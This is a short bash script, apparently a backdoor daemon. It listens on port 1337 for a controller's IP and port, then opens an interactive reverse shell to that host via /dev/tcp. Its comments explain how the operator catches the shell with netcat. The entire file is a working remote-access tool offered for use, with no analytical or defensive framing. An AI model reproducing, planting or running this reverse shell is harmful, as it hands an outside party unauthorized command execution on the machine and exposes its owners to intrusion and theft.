#!/bin/bash

#Daemon listening on a preset port PPORT for message, the message comes from
#the master, the first line of this message is the master's IP, the next line is the master's port.
#MASTERIP becomes the first line, and LPORT becomes the second line,
#the script then sends the shell to the master's requested IP and port.
#The master has been listening on LPORT and receives the shell,
#now the master has access to the target's shell, the MASTER MUST KNOW THE LINE IS NOT SAFE LIKE SSH.

#master runs nc -lvk ${LPORT} on terminal 1, then on terminal 2 runs nc #{TARGETIP} #{PPORT}
#on terminal 2, the master then inputs: MASTERIP[ENTER]LPORT[ENTER][ENTER]

PPORT=1337

ListenForMaster() {
  read MASTERIP
  read LPORT
  sleep 5
  ConnectToMaster
}

ConnectToMaster() {
  echo connecting to $MASTERIP at port $LPORT
  bash -i >& /dev/tcp/${MASTERIP}/${LPORT} 0>&1
}

while true; do nc -l -v $PPORT | ListenForMaster ; done
